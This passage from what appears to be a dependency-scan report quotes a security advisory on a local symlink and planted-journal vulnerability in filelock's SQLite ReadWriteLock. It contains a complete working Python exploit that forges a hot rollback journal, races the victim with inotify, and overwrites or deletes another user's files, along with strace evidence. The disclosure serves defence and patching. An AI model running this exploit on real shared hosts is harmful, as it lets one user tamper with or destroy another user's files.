816](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L816). The check in [`_raise_if_database_replaced` at line 836](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L836) runs only after `BEGIN`. Both [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) inspect the descriptor, not the file SQLite is on. The one-level hard link of the macOS route is [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029).\n\n## Introduced\n\nThe `/proc/self/fd` redirect came with `4d45e83` (\"Merge commit from fork\", the fix for GHSA-j8f7-rjxc-mr56), first released in **4.0.9** (verified: `git tag --contains 4d45e83` gives 4.0.9); 4.0.8 does not have it. The side-file variants are older. They reproduce on `cfd4446` (\"feat(lock): add SQLite-based ReadWriteLock (#399)\"), first released in **3.20.4** (verified), which passed the lock path straight to `sqlite3.connect`.\n\n## Mechanism\n\nOn Linux the lock opens the database with `O_RDWR|O_CREAT|O_NOFOLLOW|O_NONBLOCK`. It checks through the descriptor that the file is a regular file and not a WAL database. It then calls `sqlite3.connect(\"/proc/self/fd/\u003cn\u003e\")` and expects SQLite to reopen the validated inode. SQLite does not open that name. It runs `readlink()` on it, which yields the path string the kernel reports for the descriptor at that moment, and opens that string by path, following every symlink. Without interference the trace shows `readlink(\"/proc/534/fd/3\") = \"/tmp/benign/app.lock.db\"` and then a second `openat` of that path. The descriptor contributes only a string. Once the directory entry behind the descriptor is gone, the string is `\u003cdatabase\u003e (deleted)`. A symlink with that exact name sends SQLite wherever its creator chose.\n\nThe other user prepares the directory before the lock user runs. They create a database `cache.lock.db` (`0666`, so the lock user's lock accepts it) with a second hard link `cache.lock.db.keep`, and the symlink `cache.lock.db (deleted) -\u003e /tmp/victim-notes.txt`. The lock user's `os.open` raises an inotify `IN_OPEN` event. The other user unlinks `cache.lock.db` and links `cache.lock.db.keep` back under the same name. The lock user's descriptor still refers to the unlinked entry, so `/proc/self/fd/3` now reads `/tmp/shared-cache/cache.lock.db (deleted)`. `sqlite3.connect` resolves it, follows the symlink and opens the target `O_RDWR|O_CREAT`. None of filelock's checks look at that file. `_open_lock_database` and `_raise_if_wal` inspect descriptor 3. `_raise_if_database_replaced` compares an `lstat` of the lock path with the descriptor's `(st_dev, st_ino)`, which passes because the other user linked the same inode back, and it runs only after `BEGIN`.\n\nThe damage comes from the first statement, `PRAGMA journal_mode=MEMORY`. SQLite finds `\u003ctarget\u003e-journal`, treats it as the rollback journal of an interrupted transaction, and copies its page records into the target before it checks whether the target is a database at all. The journal header supplies the page size and the page count SQLite resizes the file to. Whoever wrote the journal computed the per-page checksum. The content from offset 0 and the final length are therefore the other user's. Strace of the lock user's process (SQLite 3.40.1):\n\n```\nopenat(\"/tmp/shared-cache/cache.lock.db\", O_RDWR|O_CREAT|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC, 0600) = 3\nreadlink(\"/proc/3819/fd/3\", \"/tmp/shared-cache/cache.lock.db (deleted)\", 4096) = 41\nreadlink(\"/tmp/shared-cache/cache.lock.db (deleted)\", \"/tmp/victim-notes.txt\", 4096) = 21\nopenat(\"/tmp/victim-notes.txt\", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 4\nopenat(\"/tmp/victim-notes.txt-journal\", O_RDWR|O_NOFOLLOW|O_CLOEXEC) = 5\npread64(5, \"ATTACKER CONTENT WRITTEN BY THE \"..., 4096, 516) = 4096\npwrite64(4, \"ATTACKER CONTENT WRITTEN BY THE \"..., 4096, 0) = 4096\nunlink(\"/tmp/victim-notes.txt-journal\") = -1 EPERM            -\u003e \"disk I/O error\"\n```\n\nThe redirect itself needs no journal. The constructor's validation connection already makes SQLite open the target with `O_CREAT`. With the symlink pointing at a missing path in the lock user's home, constructing the lock created that file (empty, `0644`, owned by the lock user) and raised nothing. With the symlink pointing at a `0600` WAL-mode SQLite database of the lock user, `write_lock()` returned without error and the database's header bytes 18 and 19 changed from `2 2` to `1 1`. The pragma converted the lock user's database out of WAL mode, and the redirected acquire held its SQLite lock on that database rather than on the lock database.\n\n**Side-file names beside the database.** Two comments record the belief that SQLite names its side files after the descriptor path ([line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), [line 1095](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1095)). The path is not synthetic to SQLite. It derives `\u003cdatabase\u003e-journal`, `\u003cdatabase\u003e-wal` and `\u003cdatabase\u003e-shm` from the resolved real path in the shared directory. `journal_mode=MEMORY` governs only journals SQLite would write, not ones it finds. These variants need no redirect.\n\n*A hot `-journal` makes the lock user unlink a file the journal names; no race.* The other user unlinks the lock user's empty `lock.db`, puts a one-page SQLite database (`0666`) in its place, and writes a 46-byte `lock.db-journal`: a path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. SQLite treats a journal beside a non-empty database as hot (left by an interrupted transaction). The tail names a \"super-journal\", and recovery ends by unlinking that file. The lock user's next `read_lock()` or `write_lock()` returns without error and the named file is gone (`unlink(\"/home/victim/private/notes.txt\") = 0`, from a `0700` directory of the lock user). The named file must be a non-empty regular file the lock user can read and unlink. A FIFO planted as `lock.db-journal` instead blocks `read_lock(timeout=2)` in SQLite's `open()` of the journal (still blocked when killed after 10 s).\n\n*A re-planted `-wal` puts the holder in WAL mode past `_raise_if_wal`.* `_raise_if_wal` checks header bytes 18 and 19. Whenever a connection takes its first lock, SQLite stats `\u003cdb\u003e-wal`, and if that file and the database are both non-empty it opens the WAL whatever the header says. The pragma at line 816 converts such a database and unlinks `-wal` and `-shm`. The `BEGIN` at line 833 is a separate statement that starts unlocked and stats `\u003cdb\u003e-wal` again. Re-creating the 32-byte `-wal` in that gap landed on the first attempt in 20 of 20 runs on a 2-CPU machine.\n\nThe lock user's `with lock.write_lock():` then holds the `-shm` byte-120 WAL write lock and only SHARED on the database. Once the other user removes the `-wal`, a second process of the lock user gets `read_lock(timeout=1)` granted while the writer is inside its block, with no exception on either side. SQLite also creates `\u003cdb\u003e-shm` with the database's permission bits (`0666`) and keeps it mapped into memory. After the other user truncates it, the writer dies with `SIGBUS` (the signal for touching a mapped file region that no longer exists) in `connection.rollback()` during `release()`.\n\n*A `-wal` in a sticky directory makes every acquire raise; no race, no access to the database.* Beside the lock user's own empty `0600` database, a non-empty `\u003cdb\u003e-wal` (one byte, any mode; a directory or FIFO works too) is a leftover SQLite tries to delete. In a `1777` directory the lock user cannot unlink another user's file (`unlink(...) = -1 EPERM`), so the pragma fails with `SQLITE_IOERR_DELETE`. The code in [`_do_acquire_inner`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L763) translates only \"database is locked\" into `Timeout`. `sqlite3.OperationalError: disk I/O error` therefore leaves every `acquire_read()` / `acquire_write()` (and the async variants) within milliseconds, whatever `timeout` or `blocking` says, until the file's owner or root removes it.\n\n*Further effects observed at this commit in a non-sticky directory.* A `0755` script owned by the lock user, renamed to the lock path with a one-record journal beside it, ends up holding the other user's bytes (the acquire raises `file is not a database`). A hard link to the lock user's `0600` `~/.profile` at the lock path does the same in a sticky `/tmp` when `fs.protected_hardlinks=0`. When the locking process runs as root, SQLite runs `fchown` on a `-wal` or `-shm` it opens to match the owner of the database, so root's `0600` `service.env` renamed to `app.lock.db-wal` belonged to the other user after root's `read_lock()`.\n\nA journal whose super-journal names the database itself makes SQLite open and close a second descriptor on the database, which drops the process's POSIX locks, so `acquire_read` returns with no lock held in `/proc/locks` and a writer in another process acquires (two journals in a row, one per statement; write locks are not affected). A one-byte `lock.db-wal` plus a `lock.db-shm` on which the other user holds two byte locks makes the acquire take 10 s regardless of `timeout` and raise `locking protocol`, or die with `SIGBUS` if the other user truncates the `-shm`.\n\n**The hard-link route in a directory without the sticky bit.** None of the above occurs on the `_link_beside` branch (macOS, Linux without `/proc`). There SQLite's main file is `.filelock-…/lock.db` in the connecting user's `0700` directory. That protection holds only where no other user can rename the `.filelock-*` entry itself, because `0700` protects the contents, not the entry in the parent. `_link_beside` checks the link once and returns a pathname, and every later use is by that name.\n\nWith `/proc` hidden in a `0777` directory, the other user staged a directory holding a hard link `lock.db` to a one-page database and a hot `lock.db-journal`. They held `BEGIN EXCLUSIVE` on the database so the lock user's first statement waited in the busy handler (SQLite's retry loop for a locked database), renamed the lock user's `.filelock-*` directory aside, renamed the staged directory onto its name and rolled back. SQLite got SHARED, found the journal under the swapped name and unlinked the file it named. The lock user's process reported the lock held and exited 0. A polling variant without the write lock also won (in 40 trials the file was gone after 1 to 26 starts of the lock user's program). Under the sticky bit the rename fails with `EPERM`.\n\n## Reproduction\n\nThe scanner's reproducer for `ANT-2026-KMJ2575J`, quoted as received. It ran against commit `b831496b0273`.\n\n**`repro`**\n\n```python\n#!/usr/bin/env python3\nimport os\nimport shutil\nimport subprocess\nimport sys\n\nas_victim = {\"user\": \"victim\", \"group\": \"victim\", \"extra_groups\": []}\nas_attacker = {\"user\": \"attacker\", \"group\": \"attacker\", \"extra_groups\": []}\n\n# set up: the lock database lives in a shared cache directory, 0777 and not sticky\nshared_dir = \"/tmp/shared-cache\"\nlock_db = shared_dir + \"/cache.lock.db\"\nshutil.rmtree(shared_dir, ignore_errors=True)\nos.mkdir(shared_dir)\nos.chmod(shared_dir, 0o777)\n\n# set up: a private 0600 file of the victim's in sticky /tmp, which the attacker cannot write\ntarget = \"/tmp/victim-notes.txt\"\nfor leftover in (target, target + \"-journal\"):\n    if os.path.lexists(leftover):\n        os.unlink(leftover)\noriginal = b\"original victim notes\\n\"\nwith open(target, \"wb\") as notes:\n    notes.write(original)\nshutil.chown(target, \"victim\", \"victim\")\nos.chmod(target, 0o600)\ndirect_write = subprocess.run(\n    [sys.executable, \"-c\", \"import sys; open(sys.argv[1], 'r+b')\", target], capture_output=True, text=True, **as_attacker\n)\nprint(\"attacker opening the target for writing:\", direct_write.stderr.strip().splitlines()[-1])\nassert direct_write.returncode != 0\n\n# attack: a hot journal beside the target, and a redirect of the victim's SQLite from the lock database to the target\ncontent = \"ATTACKER CONTENT WRITTEN BY THE VICTIM'S ReadWriteLock\\n\"\nsubprocess.run([sys.executable, \"/tmp/repro.d/plant_hot_journal.py\", target, content], check=True, **as_attacker)\nredirect = subprocess.Popen(\n    [sys.executable, \"/tmp/repro.d/redirect_lock_db.py\", lock_db, target], stdout=subprocess.PIPE, text=True, **as_attacker\n)\nassert redirect.stdout.readline() == \"ready\\n\"\n\n# the victim takes its read lock; the attacker races each acquire, so the victim runs up to 20 times\nfor run in range(1, 21):\n    victim = subprocess.run(\n        [sys.executable, \"/tmp/repro.d/victim_app.py\", lock_db], capture_output=True, text=True, timeout=60, **as_victim\n    )\n    with open(target, \"rb\") as notes:\n        after = notes.read()\n    if after != original:\n        break\nredirect.kill()\nredirect.wait()\n\n# check: taking a lock on cache.lock.db must leave the victim's notes alone\nprint(f\"victim run {run}: exit status {victim.returncode}:\", (victim.stderr.strip() or \"no error\").splitlines()[-1])\nstatus = os.stat(target)\nprint(\"target owner, mode, size:\", status.st_uid, oct(status.st_mode \u0026 0o7777), status.st_size)\nprint(\"target before:\", original)\nprint(\"target after: \", after[:60])\nprint(\"BUG\" if after == content.encode().ljust(4096, b\"\\0\") else \"OK\")\n```\n\n**`repro.d/plant_hot_journal.py`**\n\n```python\n#!/usr/bin/env python3\n\"\"\"The attacker: leave a rollback journal beside TARGET whose one record restores TARGET's first page to CONTENT.\"\"\"\n\nimport os\nimport struct\nimport sys\n\ntarget, content = sys.argv[1], sys.argv[2].encode()\njournal_path = target + \"-journal\"\n\n# https://www.sqlite.org/fileformat2.html#the_rollback_journal\nJOURNAL_MAGIC = bytes.fromhex(\"d9d505f920a163d7\")\npage_size, sector_size, nonce = 4096, 512, 0x11223344\nrecord_count = 1\npages_after_rollback = 1  # SQLite truncates TARGET to this many pages\nheader = JOURNAL_MAGIC + struct.pack(\"\u003eIIIII\", record_count, nonce, pages_after_rollback, sector_size, page_size)\n\npage_number = 1  # page 1 starts at offset 0\npage_image = content.ljust(page_size, b\"\\0\")\n# SQLite's pager_cksum(): the nonce plus every 200th byte, counting down from page_size - 200\nchecksum = (nonce + sum(page_image[i] for i in range(page_size - 200, 0, -200))) \u0026 0xFFFFFFFF\nrecord = struct.pack(\"\u003eI\", page_number) + page_image + struct.pack(\"\u003eI\", checksum)\n\nwith open(journal_path, \"wb\") as journal:\n    journal.write(header.ljust(sector_size, b\"\\0\") + record)\nos.chmod(journal_path, 0o666)  # the victim's SQLite opens a hot journal O_RDWR\n```\n\n**`repro.d/redirect_lock_db.py`**\n\n```python\n#!/usr/bin/env python3\n\"\"\"The attacker: make the victim's SQLite, connecting through /proc/self/fd/\u003cn\u003e, open TARGET instead of LOCK_DB.\"\"\"\n\nimport ctypes\nimport os\nimport sys\n\nlock_db, target = sys.argv[1], sys.argv[2]\nspare_name = lock_db + \".keep\"\n\n# the attacker creates the lock database, world-writable so that the victim's ReadWriteLock accepts it\nos.close(os.open(lock_db, os.O_CREAT | os.O_WRONLY))\nos.chmod(lock_db, 0o666)\nos.link(lock_db, spare_name)\n\n# what /proc/\u003cpid\u003e/fd/\u003cn\u003e reads back as once the name the descriptor was opened through is unlinked\nos.symlink(target, lock_db + \" (deleted)\")\n\nIN_OPEN = 0x20\nlibc = ctypes.CDLL(None, use_errno=True)\ninotify = libc.inotify_init1(0)\nif libc.inotify_add_watch(inotify, lock_db.encode(), IN_OPEN) \u003c 0:\n    raise OSError(ctypes.get_errno(), \"inotify_add_watch\", lock_db)\nprint(\"ready\", flush=True)\n\nwhile True:\n    os.read(inotify, 4096)  # the victim's ReadWriteLock has opened the database and is validating its descriptor\n    os.unlink(lock_db)\n    os.link(spare_name, lock_db)  # the same inode back at the path, so filelock's later lstat sees no change\n```\n\n**`repro.d/victim_app.py`**\n\n```python\n#!/usr/bin/env python3\n\"\"\"The victim: an application that takes its shared read lock once, as in docs/how-to.rst.\"\"\"\n\nimport sys\n\nfrom filelock import ReadWriteLock\n\nrw = ReadWriteLock(sys.argv[1])\nwith rw.read_lock(timeout=5):\n    pass\n```\n\n## Attack sequence\n\nThe redirect, with `A` the other local user:\n\n```mermaid\nsequenceDiagram\n    participant A as other local user\n    participant V as lock user's process (filelock)\n    participant S as SQLite inside that process\n    participant K as kernel and filesystem\n    rect rgb(255, 214, 214)\n        Note over A,K: filelock 4.0.9 to 4.2.0 on Linux, lock directory 0777 without the sticky bit\n        A-\u003e\u003eK: create cache.lock.db (0666) and a second hard link cache.lock.db.keep\n        A-\u003e\u003eK: symlink \"cache.lock.db (deleted)\" pointing at /tmp/victim-notes.txt\n        A-\u003e\u003eK: write /tmp/victim-notes.txt-journal (hot rollback journal, one page record)\n        V-\u003e\u003eK: open(cache.lock.db, O_RDWR O_CREAT O_NOFOLLOW) gives fd 3, fstat says regular, header not WAL\n        K--\u003e\u003eA: inotify IN_OPEN on cache.lock.db\n        A-\u003e\u003eK: unlink(cache.lock.db) then link(cache.lock.db.keep, cache.lock.db)\n        V-\u003e\u003eS: sqlite3.connect(\"/proc/self/fd/3\")\n        S-\u003e\u003eK: readlink(/proc/self/fd/3) returns \"cache.lock.db (deleted)\"\n        S-\u003e\u003eK: open(\"cache.lock.db (deleted)\") follows the symlink to victim-notes.txt\n        V-\u003e\u003eS: PRAGMA journal_mode=MEMORY\n        S-\u003e\u003eK: open(victim-notes.txt-journal), pread page 1, pwrite it at offset 0 of victim-notes.txt\n        Note over V,K: victim-notes.txt (0600, 22 bytes) is now the other user's 4096-byte page image, the lock user sees \"disk I/O error\"\n        V-\u003e\u003eK: lstat(cache.lock.db) matches fd 3 identity, so _raise_if_database_replaced passes\n    end\n```\n\nThe side-file variants, which need no redirect:\n\n```mermaid\nflowchart TD\n    B0[\"acquire validates fd, connects SQLite by a name in the shared directory\"] --\u003e B1{\"what did the other user put beside the real path?\"}\n    B1 -- \"hot -journal beside a swapped-in one-page database\" --\u003e B2[\"PRAGMA replays the journal, then unlinks the super-journal file it names, acquire succeeds\"]\n    B1 -- \"-wal re-created between PRAGMA and BEGIN\" --\u003e B3[\"holder in WAL mode, reader admitted beside the writer, SIGBUS when -shm is truncated\"]\n    B1 -- \"-wal in a sticky directory the lock user cannot unlink\" --\u003e B4[\"every acquire raises OperationalError disk I/O error, timeout ignored\"]\n    B1 -- \"name unlinked and a (deleted) symlink planted\" --\u003e B5[\"SQLite opens the symlink target with O_CREAT\"]\n    classDef ok fill:#d8f3dc,stroke:#2d6a4f,color:#1b4332;\n    classDef bad fill:#ffd6d6,stroke:#c1121f,color:#5c0000;\n    classDef info fill:#cfe4ff,stroke:#1f6feb,color:#0b1f3a;\n    class B0,B1 info;\n    class B2,B3,B4,B5 bad;\n```\n\n## Evidence\n\nThe scanner's reproducer runs the documented `ReadWriteLock(path)` + `with rw.read_lock(timeout=5):` as user `victim` against `/tmp/shared-cache/cache.lock.db` (directory `0777`, not sticky) while user `attacker` holds the symlink and reacts to inotify. It first shows that `attacker` cannot write the target (`PermissionError: [Errno 13] Permission denied: '/tmp/victim-notes.txt'`). On the first `victim` run it prints `victim run 1: exit status 1: sqlite3.OperationalError: disk I/O error`, `target owner, mode, size: 1000 0o600 4096`, target before `b'original victim notes\\n'`, after `b\"ATTACKER CONTENT WRITTEN BY THE VICTIM'S ReadWriteLock\\n\\x00...\"`, verdict `BUG`. Reacting to inotify redirected the first acquire in 77 of 77 runs. A plain unlink/link busy loop with no inotify also won on the first run. A process holding two `ReadWriteLock` instances on one database keeps an idle descriptor; a swap done a full second before the second acquire redirected it. The `-wal` re-plant landed on the first attempt in 20 of 20 runs. The journal-unlink variant needs no race.\n\nOur verification: the reproducer prints `BUG` on the scanned commit `b831496` and on the 4.2.0 image (`e2e7d70`). On the PR #834 head it prints `OK`: all 20 `victim` runs exit 0 with no error and the target stays `1000 0o600 22` bytes with its original content. The independent review also ran the sticky-directory `-wal` variant (a `0600` database owned by `victim` in a `1777` directory, other user plants `\u003cdb\u003e-wal`). 4.2.0 raises `OperationalError: disk I/O error`; the PR head takes read and write locks with the file still present.\n\n## Impact\n\nAnother local user who can write the non-sticky directory holding the database makes the lock user's process act on a file other than the lock database, with the lock user's privileges, on Linux. The process writes bytes of the other user's choosing from offset 0 into any non-empty regular file the lock user can write, resized to a whole number of pages, provided the other user can create `\u003cfile\u003e-journal` beside it (the lock user's own `0600` files in `/tmp` qualify). Without a journal the process creates an empty file at any path it may create, or converts a WAL-mode SQLite database of its own to rollback mode with no error. A journal beside a swapped-in database makes the process unlink one regular file of the other user's choosing per journal; the acquire succeeds and raises nothing. A process inside `write_lock()` stops excluding the lock user's other processes from `read_lock()`, and the holder can die from a `SIGBUS` that arrives in `release()`.\n\nIt is **not** reachable for a database the lock user owns in `/tmp` with `fs.protected_regular` 1 or 2. There only the planted `-wal` denial of service remains: every acquire raises an undocumented `sqlite3.OperationalError` that `Timeout` and `OSError` handlers do not catch. It is a bypass of the fix for GHSA-j8f7-rjxc-mr56 (4.0.9), which refused the symlink at the database path but followed it at `\u003cdatabase\u003e (deleted)`. Windows does not take this path.\n\n## Workarounds\n\n- Keep the `ReadWriteLock` database in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share one `ReadWriteLock` database between accounts through a `0777` or group-writable directory. The lock creates its database `0600`, and leaving it that way keeps other accounts from supplying its content.\n- For a lock in a sticky directory keep `fs.protected_regular` at 1 or 2 and `fs.protected_hardlinks=1` (distribution defaults). Treat a sudden `sqlite3.OperationalError: disk I/O error` on every acquire as a foreign `\u003cdb\u003e-wal` beside the database that the file's owner or root has to remove.\n\n## Patched version\n\n4.2.1.\n\nFix: https://github.com/tox-dev/filelock/pull/834\n\n## Credits\n\nReported by Anthropic's OSS Scanner (automated analysis), 15 October 2026; reviewed by the maintainers.\n\n- 2026-10-15 23:08 UTC: report received (scan `filelock-20261015-005` of commit `b831496b0273`)\n- 2026-10-16 00:46 UTC: draft advisory created\n- 2026-10-16 01:15 UTC: fix PR #834 opened"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-112940](https://osv.dev/CVE-2026-112940)**.\n\n## [GHSA-v4x8-3wr5-3wq8](https://osv.dev/GHSA-v4x8-3wr5-3wq8)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e `ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) hand SQLite a name they do not control. On Linux the lock validates its database through a descriptor (the number the kernel gives a process for an open file). It then connects SQLite to `/proc/self/fd/\u003cn\u003e`, a Linux path that names the process's own open file `n`. SQLite turns that path back into a plain path and reopens it by name, following symlinks (a symlink is a file that points at another path). On every POSIX route SQLite also acts on `-journal`, `-wal` and `-shm` files it finds beside that name. Those are SQLite's side files: the rollback journal (pages saved to undo an interrupted write), the write-ahead log or WAL (changes kept outside the main file), and the shared-memory index for the WAL.\n\u003e \n\u003e Another local user who can create or rename entries in the directory that holds the lock database can turn this against the user running the lock (below: the lock user). Such a directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). That other user can make the lock user's ordinary `read_lock()` or `write_lock()` write bytes of the other user's choosing into the lock user's own files. The same position lets the other user make that call create or unlink files of the lock user, admit a reader beside a writer, or kill the holder. All of this runs with the lock user's privileges. In a sticky directory such as `/tmp` a planted `-wal` file makes every acquire fail. Affected versions are filelock 3.20.4 through 4.2.0 (the `/proc/self/fd` redirect since 4.0.9, the side-file variants since 3.20.4).\n\u003e \n\u003e Anthropic's OSS Scanner reported this in private as `ANT-2026-KMJ2575J` [high, CWE-363]: ReadWriteLock: SQLite still follows planted symlinks, overwriting files.\n\u003e \n\u003e ## Severity\n\u003e \n\u003e **CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` scores 7.1 (High).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): the planted-journal variant needs no race, and the redirect won 77 of 77 attempts. `I:H` (high integrity impact): the other user writes bytes of their choosing into files of the lock user and unlinks files of their choosing. `A:H` (high availability impact): the other user makes every acquire fail or kills the lock holder. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.\n\u003e \n\u003e Classification from the external review: **conditional security**, a cross-user effect that exists only when another user can change names in the lock database's directory. The review notes that the 77/77 inotify result (inotify is a Linux interface that reports file events) is stronger evidence than a theoretical TOCTOU (a time-of-check to time-of-use race). The scanner rated it high. The review accepts the mechanism and narrows it to that precondition.\n\u003e \n\u003e ## Scope and preconditions\n\u003e \n\u003e - The other party is a different local account that can create or rename entries in the directory that holds the lock database. That is a `0777` directory or a group-writable one (including a setgid `2775` project directory shared with that account), in each case without the sticky bit. The lock user's lock must be able to open the database read-write, so a database the other user creates is `0666`. filelock itself creates the database `0600`.\n\u003e - Sticky directories (`/tmp`, `/var/tmp`, any `1777` directory) narrow the finding rather than exclude it. The redirect and the journal replay do not reach a database the lock user owns there (tested with `fs.protected_regular=2`). What remains is a planted non-empty `\u003cdb\u003e-wal` (any mode; a directory or FIFO works too) that the lock user cannot unlink. It makes every acquire raise `sqlite3.OperationalError: disk I/O error`. A hard link (a second name for the same file) to a file of the lock user at the lock path also remains, if `fs.protected_hardlinks=0`.\n\u003e - Two kernel settings matter. `fs.protected_regular` (1 or 2 is the systemd default on most distributions; the kernel's own default is 0) keeps a user from opening a file another user owns in a sticky world-writable directory. Where it is 0, the other user can own the database in `/tmp`, and SQLite follows a planted symlink itself (not tested). `fs.protected_hardlinks=1` (most distributions; kernel default 0) blocks a hard link of a lock user's file onto the lock path. Neither setting affects a non-sticky shared directory.\n\u003e - Platform and route. The `/proc/self/fd` redirect is Linux with `/proc` mounted, 4.0.9 and later. The side-file variants (`-journal`, `-wal`, `-shm`) exist on every POSIX route. On the hard-link route (macOS since 4.1.1 for every connection, Linux without `/proc`) they need the link-directory swap described under \"Mechanism\", so a non-sticky parent. Neither the scanner nor the review executed on macOS; the statement rests on the platform branch and the identical code after it. Windows does not take this path.\n\u003e - Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename an entry in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e At the scanned commit `b831496b0273`: [`_connect_through_descriptor` builds `/proc/self/fd/\u003cn\u003e` and hands it to `sqlite3.connect`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L982-L1001). The assumption is the [comment at line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), \"Descriptor paths reopen the validated inode\" (an inode is the kernel's identity for a file, independent of its name). SQLite first reads the file it opened at [`PRAGMA journal_mode=MEMORY`, line 816](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L816). The check in [`_raise_if_database_replaced` at line 836](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L836) runs only after `BEGIN`. Both [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) inspect the descriptor, not the file SQLite is on. The one-level hard link of the macOS route is [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029).\n\u003e \n\u003e ## Introduced\n\u003e \n\u003e The `/proc/self/fd` redirect came with `4d45e83` (\"Merge commit from fork\", the fix for GHSA-j8f7-rjxc-mr56), first released in **4.0.9** (verified: `git tag --contains 4d45e83` gives 4.0.9); 4.0.8 does not have it. The side-file variants are older. They reproduce on `cfd4446` (\"feat(lock): add SQLite-based ReadWriteLock (#399)\"), first released in **3.20.4** (verified), which passed the lock path straight to `sqlite3.connect`.\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e On Linux the lock opens the database with `O_RDWR|O_CREAT|O_NOFOLLOW|O_NONBLOCK`. It checks through the descriptor that the file is a regular file and not a WAL database. It then calls `sqlite3.connect(\"/proc/self/fd/\u003cn\u003e\")` and expects SQLite to reopen the validated inode. SQLite does not open that name. It runs `readlink()` on it, which yields the path string the kernel reports for the descriptor at that moment, and opens that string by path, following every symlink. Without interference the trace shows `readlink(\"/proc/534/fd/3\") = \"/tmp/benign/app.lock.db\"` and then a second `openat` of that path. The descriptor contributes only a string. Once the directory entry behind the descriptor is gone, the string is `\u003cdatabase\u003e (deleted)`. A symlink with that exact name sends SQLite wherever its creator chose.\n\u003e \n\u003e The other user prepares the directory before the lock user runs. They create a database `cache.lock.db` (`0666`, so the lock user's lock accepts it) with a second hard link `cache.lock.db.keep`, and the symlink `cache.lock.db (deleted) -\u003e /tmp/victim-notes.txt`. The lock user's `os.open` raises an inotify `IN_OPEN` event. The other user unlinks `cache.lock.db` and links `cache.lock.db.keep` back under the same name. The lock user's descriptor still refers to the unlinked entry, so `/proc/self/fd/3` now reads `/tmp/shared-cache/cache.lock.db (deleted)`. `sqlite3.connect` resolves it, follows the symlink and opens the target `O_RDWR|O_CREAT`. None of filelock's checks look at that file. `_open_lock_database` and `_raise_if_wal` inspect descriptor 3. `_raise_if_database_replaced` compares an `lstat` of the lock path with the descriptor's `(st_dev, st_ino)`, which passes because the other user linked the same inode back, and it runs only after `BEGIN`.\n\u003e \n\u003e The damage comes from the first statement, `PRAGMA journal_mode=MEMORY`. SQLite finds `\u003ctarget\u003e-journal`, treats it as the rollback journal of an interrupted transaction, and copies its page records into the target before it checks whether the target is a database at all. The journal header supplies the page size and the page count SQLite resizes the file to. Whoever wrote the journal computed the per-page checksum. The content from offset 0 and the final length are therefore the other user's. Strace of the lock user's process (SQLite 3.40.1):\n\u003e \n\u003e ```\n\u003e openat(\"/tmp/shared-cache/cache.lock.db\", O_RDWR|O_CREAT|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC, 0600) = 3\n\u003e readlink(\"/proc/3819/fd/3\", \"/tmp/shared-cache/cache.lock.db (deleted)\", 4096) = 41\n\u003e readlink(\"/tmp/shared-cache/cache.lock.db (deleted)\", \"/tmp/victim-notes.txt\", 4096) = 21\n\u003e openat(\"/tmp/victim-notes.txt\", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 4\n\u003e openat(\"/tmp/victim-notes.txt-journal\", O_RDWR|O_NOFOLLOW|O_CLOEXEC) = 5\n\u003e pread64(5, \"ATTACKER CONTENT WRITTEN BY THE \"..., 4096, 516) = 4096\n\u003e pwrite64(4, \"ATTACKER CONTENT WRITTEN BY THE \"..., 4096, 0) = 4096\n\u003e unlink(\"/tmp/victim-notes.txt-journal\") = -1 EPERM            -\u003e \"disk I/O error\"\n\u003e 